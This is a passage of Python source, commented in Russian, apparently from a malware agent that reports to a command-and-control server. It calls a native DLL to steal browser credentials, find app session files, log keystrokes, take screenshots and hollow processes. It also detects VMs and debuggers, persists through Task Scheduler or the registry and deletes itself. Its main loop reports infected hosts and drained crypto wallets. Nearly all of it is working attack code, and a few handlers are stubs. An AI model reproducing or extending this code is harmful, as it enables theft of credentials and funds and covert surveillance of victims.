                    err = f"Failed to parse credentials JSON: {e}. Raw string: {creds_json_str[:200]}..."
                    self.logger.error(err)
                    # Возвращаем сырую строку, если парсинг не удался
                    return {"raw_credential_data": creds_json_str}, err 
            else:
                # Функция вернула NULL, возможно, ничего не найдено или произошла ошибка в C++
                # (Ошибки должны были логироваться в C++)
                self.logger.warning("StealBrowserCredentials returned NULL. No credentials found or native error occurred.")
                # Возвращаем пустой результат
                return {"browser_credentials": {"chrome_edge_keys": [], "firefox_files": []}}, None 

        except Exception as e:
            err = f"Exception calling StealBrowserCredentials: {e}"
            self.logger.exception(err)
            # Если была ошибка и creds_ptr был получен, пытаемся освободить память
            if creds_ptr: 
                try:
                    self.injector_lib.free_error_message(creds_ptr)
                except Exception as free_e:
                     self.logger.error(f"Exception freeing creds_ptr after another error: {free_e}")
            return None, err

    def _send_task_result(self, task_id: str, result: Any, error: Optional[str]):
        """Отправляет результат выполнения задачи на C2 сервер."""
        if not self.agent_id:
            self.logger.error("Cannot send task result: Agent not registered.")
            return
        if not task_id:
            self.logger.error("Cannot send task result: Missing task_id.")
            return

        c2_url_base = os.environ.get("C2_URL", f"http://{self.config['c2_servers'][0]}")
        result_url = f"{c2_url_base}/agents/{self.agent_id}/results/{task_id}"

        payload = {
            "task_id": task_id,
            "completed_at": time.time(),
            "status": "error" if error else "completed",
            "output": result,
            "error_message": error
        }

        # Сериализация результата, если он не является базовым типом JSON
        def default_serializer(obj):
            if isinstance(obj, (bytes, bytearray)):
                 # Попытка декодировать как UTF-8, с заменой ошибок
                try:
                    return obj.decode('utf-8', errors='replace')
                except Exception:
                    return repr(obj) # Если не удалось, вернуть строковое представление
            return repr(obj) # Возвращаем строковое представление для других несериализуемых типов

        try:
            # Используем json.dumps с default для обработки несериализуемых типов
            json_payload = json.dumps(payload, default=default_serializer)
            headers = {'Content-Type': 'application/json'}
            response = requests.post(result_url, data=json_payload, headers=headers, timeout=15)
            response.raise_for_status()
            self.logger.info(f"Successfully sent result for task {task_id} to C2.")
        except requests.RequestException as e:
            self.logger.error(f"Failed to send result for task {task_id} to {result_url}: {e}")
        except TypeError as e:
            self.logger.error(f"Serialization error sending result for task {task_id}: {e}. Payload: {payload}")
        except Exception as e:
            self.logger.error(f"Unexpected error sending task result {task_id}: {e}")

    def _handle_scan_files(self, start_path: str, masks: str, max_depth: int) -> Tuple[Any, Optional[str]]:
        # ... existing scan_files handler ...
        pass # Placeholder

    def _handle_find_app_sessions(self, app_names: str) -> Tuple[Any, Optional[str]]:
        """Обрабатывает команду поиска файлов сессий приложений"""
        if not self.injector_lib:
            return None, "Injector library not loaded."
        if platform.system() != "Windows":
             return None, "Finding app session files via native DLL only supported on Windows."
             
        sessions_ptr = None
        try:
            self.logger.info(f"Attempting to find session files for apps: '{app_names}'")
            # Передаем строку как UTF-8 байты
            app_names_b = app_names.encode('utf-8')
            
            sessions_ptr = self.injector_lib.FindAppSessionFiles(app_names_b) # Возвращает char*
            
            if sessions_ptr:
                # Декодируем JSON строку из C (предполагаем UTF-8)
                sessions_json_str = sessions_ptr.decode('utf-8', errors='ignore')
                self.logger.info(f"Successfully retrieved app session paths (JSON length: {len(sessions_json_str)}).")
                
                # Освобождаем память C строки *после* декодирования
                self.injector_lib.free_error_message(sessions_ptr)
                
                # Пытаемся распарсить JSON для валидации
                try:
                    sessions_data = json.loads(sessions_json_str)
                    self.logger.info(f"Successfully parsed app session paths JSON.")
                    # Возвращаем распарсенный JSON
                    return {"app_session_paths": sessions_data}, None 
                except json.JSONDecodeError as e:
                    err = f"Failed to parse app session paths JSON: {e}. Raw string: {sessions_json_str[:200]}..."
                    self.logger.error(err)
                    # Возвращаем сырую строку, если парсинг не удался
                    return {"raw_app_session_paths": sessions_json_str}, err 
            else:
                # Функция вернула NULL, возможно, ничего не найдено или произошла ошибка в C++
                self.logger.info("FindAppSessionFiles returned NULL. No relevant paths found or native error occurred.")
                # Возвращаем пустой результат
                return {"app_session_paths": {}}, None 

        except Exception as e:
            err = f"Exception calling FindAppSessionFiles: {e}"
            self.logger.exception(err)
            # Если была ошибка и sessions_ptr был получен, пытаемся освободить память
            if sessions_ptr: 
                try:
                    self.injector_lib.free_error_message(sessions_ptr)
                except Exception as free_e:
                     self.logger.error(f"Exception freeing sessions_ptr after another error: {free_e}")
            return None, err

    def _handle_persist(self, method: str, name: str, path: str, args: Optional[str]) -> Tuple[Any, Optional[str]]:
        # ... existing handler ...
        pass # Placeholder

    def _handle_self_delete(self, file_path_to_delete: str) -> Tuple[Any, Optional[str]]:
        """Обрабатывает команду самоудаления агента"""
        if not self.injector_lib:
            return None, "Injector library not loaded."
        if platform.system() != "Windows":
             return None, "Self-deletion only supported on Windows."
        
        ret_code = -1
        try:
            self.logger.info(f"Attempting to schedule self-deletion for file: '{file_path_to_delete}'")
            path_w = ctypes.c_wchar_p(file_path_to_delete)
            
            ret_code = self.injector_lib.SelfDelete(path_w)
            
            if ret_code == 0:
                success_msg = f"Self-deletion command for '{file_path_to_delete}' launched successfully. Agent should exit soon."
                self.logger.info(success_msg)
                # Важно: Агент должен сам завершить работу после вызова этой команды
                # threading.Timer(5, self.stop).start() # Примерно через 5 сек остановить главный цикл агента
                # Или более прямой выход:
                # threading.Timer(5, lambda: os._exit(0)).start() 
                # Пока просто возвращаем успех, C2 должен знать, что агент скоро пропадет.
                return {"status": "success", "message": success_msg}, None
            else:
                err = f"Failed to launch self-deletion command. Code: {ret_code}. Message: {get_windows_error_message(ret_code) or 'Unknown error'}"
                self.logger.error(err)
                return None, err

        except Exception as e:
            err = f"Exception during self-deletion: {e}"
            self.logger.exception(err)
            return None, err

    def _load_injector_library(self):
        """Загружает нативную библиотеку инъекции"""
        # Определяем путь к DLL (предполагая, что она рядом с агентом)
        # Важно: Этот путь будет использоваться для самоудаления!
        dll_filename = 'libcpp_injector.dll'
        base_dir = os.path.dirname(os.path.abspath(__file__))
        # Предполагаем, что DLL лежит в src/native/
        lib_path = os.path.join(base_dir, 'native', dll_filename)
        
        # Проверяем существование файла перед загрузкой
        if not os.path.exists(lib_path):
            self.logger.error(f"Injector DLL not found at expected path: {lib_path}")
            # Попытка загрузить из текущей директории как fallback?
            alt_lib_path = os.path.abspath(dll_filename)
            if os.path.exists(alt_lib_path):
                self.logger.warning(f"DLL not found at {lib_path}, trying {alt_lib_path}")
                lib_path = alt_lib_path
            else:
                 self.logger.error(f"Cannot find {dll_filename} neither at {lib_path} nor {alt_lib_path}. Native features disabled.")
                 return None

        self.logger.info(f"Attempting to load injector library from: {lib_path}")
        self.config['_injector_dll_path'] = lib_path # Сохраняем путь для самоудаления
        try:
            # Используем полный путь для надежности
            lib = ctypes.CDLL(lib_path)
            self.logger.info(f"Successfully loaded library: {lib_path}")
            
            # --- Определяем сигнатуры для известных функций ---
            # inject_process_hollowing
            lib.inject_process_hollowing.argtypes = [ctypes.c_char_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_char_p)]
            lib.inject_process_hollowing.restype = ctypes.c_int
            
            # free_error_message
            lib.free_error_message.argtypes = [ctypes.c_char_p]
            lib.free_error_message.restype = None
            
            # IsVMEnvironmentDetected
            lib.IsVMEnvironmentDetected.argtypes = []
            lib.IsVMEnvironmentDetected.restype = ctypes.c_bool
            
            # IsDebuggerPresentDetected
            lib.IsDebuggerPresentDetected.argtypes = []
            lib.IsDebuggerPresentDetected.restype = ctypes.c_bool
            
            # Keylogger functions
            lib.StartKeylogger.argtypes = [ctypes.POINTER(ctypes.c_char_p)]
            lib.StartKeylogger.restype = ctypes.c_int
            lib.StopKeylogger.argtypes = [ctypes.POINTER(ctypes.c_char_p)]
            lib.StopKeylogger.restype = ctypes.c_int
            lib.GetKeyLogs.argtypes = []
            lib.GetKeyLogs.restype = ctypes.c_char_p # Возвращает JSON строку
            # free_error_message используется для освобождения памяти GetKeyLogs и Start/Stop

            # Screenshot functions
            lib.CaptureScreenshot.argtypes = []
            lib.CaptureScreenshot.restype = ctypes.c_char_p # Возвращает Base64 строку
            lib.FreeScreenshotData.argtypes = [ctypes.c_char_p]
            lib.FreeScreenshotData.restype = None

            # Steal Browser Credentials function
            lib.StealBrowserCredentials.argtypes = []
            lib.StealBrowserCredentials.restype = ctypes.c_char_p # Возвращает JSON строку
            # free_error_message используется для освобождения памяти

            # Scan Files Recursive function
            lib.ScanFilesRecursive.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_int]
            lib.ScanFilesRecursive.restype = ctypes.c_char_p # Возвращает JSON строку
            # free_error_message используется для освобождения памяти

            # Find App Session Files function
            lib.FindAppSessionFiles.argtypes = [ctypes.c_char_p]
            lib.FindAppSessionFiles.restype = ctypes.c_char_p # Возвращает JSON строку
            # free_error_message используется для освобождения памяти

            # Persistence functions
            lib.PersistViaTaskScheduler.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_char_p)]
            lib.PersistViaTaskScheduler.restype = ctypes.c_int
            lib.PersistViaRegistryRunKey.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_char_p)]
            lib.PersistViaRegistryRunKey.restype = ctypes.c_int
            # free_error_message используется для освобождения памяти ошибок

            # Self Delete function
            lib.SelfDelete.argtypes = [ctypes.c_wchar_p]
            lib.SelfDelete.restype = ctypes.c_int
            
            return lib
        except OSError as e:
            self.logger.error(f"Failed to load injector library '{lib_path}'. OS: {platform.system()}. Error: {e}")
            # В Linux/macOS это ожидаемо, но в Windows - проблема
            if platform.system() == "Windows":
                self.logger.error("CRITICAL: Running on Windows but failed to load injector DLL!")
            return None
        except AttributeError as e:
            self.logger.error(f"Attribute error while setting up functions for library '{lib_path}'. Error: {e}")
            # Это может означать, что DLL загрузилась, но не содержит ожидаемых функций
            return None

if __name__ == "__main__":
    # Проверяем наличие аргумента с путем к конфигурации
    config_path = sys.argv[1] if len(sys.argv) > 1 else None
    
    # Создаем и запускаем автономного агента
    agent = AutonomousAgent(config_path)
    agent.start()
    
    try:
        # Основной цикл с выводом статистики
        while True:
            time.sleep(60)
            stats = agent.get_stats()
            print(f"Runtime: {stats['runtime_readable']}, "
                  f"Scanned: {stats['scanned_hosts']}, "
                  f"Infected: {stats['infected_hosts']}, "
                  f"Wallets: {stats['detected_wallets']}, "
                  f"Drained: {stats['drained_wallets']}, "
                  f"Value: ${stats['total_drained_value']:.2f}")
    except KeyboardInterrupt:
        print("Stopping agent...")
        agent.stop() 